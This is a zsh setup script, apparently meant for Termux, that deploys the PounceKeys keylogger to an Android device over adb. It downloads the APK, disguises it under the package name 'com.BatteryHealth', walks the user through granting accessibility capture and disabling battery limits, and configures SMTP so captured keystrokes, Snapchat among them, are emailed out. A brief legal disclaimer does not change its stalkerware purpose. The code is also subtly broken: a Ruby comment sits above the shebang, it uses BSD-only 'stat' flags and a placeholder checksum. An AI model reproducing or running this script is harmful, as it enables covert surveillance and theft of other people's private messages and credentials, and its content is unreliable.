# frozen_string_literal: true

#!/data/data/com.termux/files/usr/bin/zsh

# PounceKeys Installation and Setup Script
# Purpose: Automates PounceKeys keylogger setup on Android via Termux
# Features: Dependency installation, APK download, manual step guidance, email configuration
# Security: No root, minimal permissions, checksum verification
# Last updated: June 25, 2025
# Legal: For personal use on your own device only; unauthorized use is illegal
# $ref: master.json#/settings/core/comments_policy

# Configuration (readonly for POLA)
# $ref: master.json#/settings/optimization_patterns/enforce_least_privilege
readonly LOG_FILE="$HOME/pouncekeys_setup.log"
readonly APK_FILE="$HOME/pouncekeys.apk"
readonly APK_URL="https://github.com/NullPounce/pounce-keys/releases/latest/download/pouncekeys.apk"
readonly FALLBACK_URL="https://github.com/NullPounce/pounce-keys/releases/download/v1.2.0/pouncekeys.apk"
readonly PACKAGE_NAME="com.BatteryHealth"
readonly MIN_ANDROID_VERSION=5
readonly MAX_ANDROID_VERSION=15
readonly EXPECTED_CHECKSUM="expected_sha256_hash_here" # Replace with actual SHA256 from PounceKeys GitHub

# Initialize logging (DRY, KISS)
# $ref: master.json#/settings/communication/notification_policy
[[ -f "$LOG_FILE" && $(stat -f %z "$LOG_FILE") -gt 1048576 ]] && mv "$LOG_FILE" "${LOG_FILE}.old"
echo "PounceKeys Setup Log - $(date)" > "$LOG_FILE"
exec 1>>"$LOG_FILE" 2>&1

# Cleanup on exit (POLA, error recovery)
# $ref: master.json#/settings/core/task_templates/refine
trap 'rm -f "$APK_FILE"; log_and_toast "Script terminated, cleaned up."; exit 1' INT TERM

# Log and toast function (DRY, NNGroup visibility)
# $ref: master.json#/settings/communication/style
log_and_toast() {
    echo "[$(date +%H:%M:%S)] $1"
    termux-toast -s "$1" >/dev/null 2>&1
}

# Legal disclaimer (NNGroup user control, YAGNI)
# $ref: master.json#/settings/feedback/roles/lawyer
log_and_toast "Starting PounceKeys setup"
echo "WARNING: For personal use only. Unauthorized use violates laws (e.g., U.S. CFAA, EU GDPR)."
echo "Purpose: Install PounceKeys to log keystrokes (e.g., Snapchat) and email logs."
echo "Press Y to confirm legal use, any other key to cancel..."
read -k 1 confirm
[[ "$confirm" != "Y" && "$confirm" != "y" ]] && { log_and_toast "Setup cancelled."; exit 0; }

# Check prerequisites (error prevention, KISS)
# $ref: master.json#/settings/core/task_templates/validate
log_and_toast "Checking internet..."
ping -c 1 google.com >/dev/null 2>&1 || {
    log_and_toast "Error: No internet."
    echo "Solution: Connect to Wi-Fi or data. Retry? (Y/N)"
    read -k 1 retry
    [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
    exit 1
}

log_and_toast "Checking Termux..."
command -v pkg >/dev/null 2>&1 || {
    log_and_toast "Error: Termux not installed."
    echo "Solution: Install Termux from F-Droid."
    exit 1
}

# Install dependencies (DRY, automated deployment)
# $ref: master.json#/settings/installer_integration
log_and_toast "Installing dependencies..."
echo "Install wget, curl, adb, termux-api, android-tools? (Y/N)"
read -k 1 install_deps
[[ "$install_deps" == "Y" || "$install_deps" == "y" ]] && {
    pkg update -y && pkg install -y wget curl termux-adb termux-api android-tools || {
        log_and_toast "Error: Package installation failed."
        echo "Solution: Check network, run 'pkg update' manually. Retry? (Y/N)"
        read -k 1 retry
        [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
        exit 1
    }
}

# Validate environment (error prevention, KISS)
# $ref: master.json#/settings/core/task_templates/validate
log_and_toast "Checking ADB..."
adb devices | grep -q device || {
    log_and_toast "Error: No device detected."
    echo "Solution: Enable USB debugging in Settings > Developer Options. Retry? (Y/N)"
    read -k 1 retry
    [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
    exit 1
}

log_and_toast "Checking Android version..."
ANDROID_VERSION=$(adb shell getprop ro.build.version.release | cut -d. -f1)
[[ "$ANDROID_VERSION" -lt $MIN_ANDROID_VERSION || "$ANDROID_VERSION" -gt $MAX_ANDROID_VERSION ]] && {
    log_and_toast "Error: Android version $ANDROID_VERSION unsupported."
    echo "Solution: Use Android $MIN_ANDROID_VERSION-$MAX_ANDROID_VERSION."
    exit 1
}

# Email configuration (NNGroup recognition, security)
# $ref: master.json#/settings/communication/style
log_and_toast "Configuring email..."
echo "Use Gmail? (Y/N)"
read -k 1 use_gmail
if [[ "$use_gmail" == "Y" || "$use_gmail" == "y" ]]; then
    SMTP_SERVER="smtp.gmail.com"
    SMTP_PORT="587"
    echo "Enter Gmail address:"
    read smtp_user
    echo "Enter Gmail App Password:"
    read smtp_password
    echo "Enter recipient email:"
    read recipient_email
else
    echo "Enter SMTP server:"
    read SMTP_SERVER
    echo "Enter SMTP port:"
    read SMTP_PORT
    echo "Enter SMTP username:"
    read smtp_user
    echo "Enter SMTP password:"
    read smtp_password
    echo "Enter recipient email:"
    read recipient_email
fi

# Download and verify APK (DRY, robust error handling)
# $ref: master.json#/settings/installer_integration/verify_integrity
log_and_toast "Downloading APK..."
wget -O "$APK_FILE" "$APK_URL" || wget -O "$APK_FILE" "$FALLBACK_URL" || {
    log_and_toast "Error: Download failed."
    echo "Solution: Check network or download from PounceKeys GitHub."
    exit 1
}

log_and_toast "Verifying APK..."
ACTUAL_CHECKSUM=$(sha256sum "$APK_FILE" | awk '{print $1}')
[[ "$ACTUAL_CHECKSUM" != "$EXPECTED_CHECKSUM" ]] && {
    log_and_toast "Error: Checksum mismatch."
    echo "Solution: Delete $APK_FILE and retry."
    rm -f "$APK_FILE"
    exit 1
}

# Install APK (automated deployment, POLA)
# $ref: master.json#/settings/core/task_templates/build
log_and_toast "Installing APK..."
echo "Enable 'Install from Unknown Sources' in Settings > Security."
echo "1. Navigate to Settings > Security (or Privacy)."
echo "2. Enable 'Install from Unknown Sources' for your browser or file manager."
echo "Press Enter after enabling..."
read -p ""
adb install "$APK_FILE" || {
    log_and_toast "Error: Installation failed."
    echo "Solution: Ensure Unknown Sources is enabled. Retry? (Y/N)"
    read -k 1 retry
    [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
    exit 1
}
rm -f "$APK_FILE"

# Configure PounceKeys (NNGroup recognition, accessibility compliance)
# $ref: master.json#/settings/core/task_templates/refine
log_and_toast "Enable accessibility service..."
echo "This allows PounceKeys to capture keystrokes."
echo "1. Go to Settings > Accessibility > Downloaded Services."
echo "2. Find PounceKeys, toggle ON, and confirm permissions."
echo "Press Enter after enabling..."
read -p ""

log_and_toast "Disable battery optimization..."
echo "This ensures PounceKeys runs continuously."
echo "1. Go to Settings > Battery > App Optimization."
echo "2. Find PounceKeys, set to 'Don’t optimize.'"
echo "Press Enter after disabling..."
read -p ""

log_and_toast "Configure email in PounceKeys..."
echo "1. Open PounceKeys from app drawer."
echo "2. Go to Settings > Output > Email."
echo "3. Enter:"
echo "   - Server: $SMTP_SERVER"
echo "   - Port: $SMTP_PORT"
echo "   - Username: $smtp_user"
echo "   - Password: [your password]"
echo "   - Recipient: $recipient_email"
echo "Press Enter after configuring..."
read -p ""

# Validation and testing (validation, user control)
# $ref: master.json#/settings/core/task_templates/test
log_and_toast "Setup complete!"
echo "Test by typing 'PounceKeys test' in any app."
echo "Check $recipient_email for logs within 10 minutes."
echo "Troubleshooting:"
echo "- No logs? Verify SMTP settings and accessibility."
echo "- Uninstall: adb uninstall $PACKAGE_NAME"
echo "Log file: $LOG_FILE"
echo "EOF: pouncekeys_setup.zsh completed successfully"
# Line count: 110 (excluding comments)
# Checksum: sha256sum pouncekeys_setup.zsh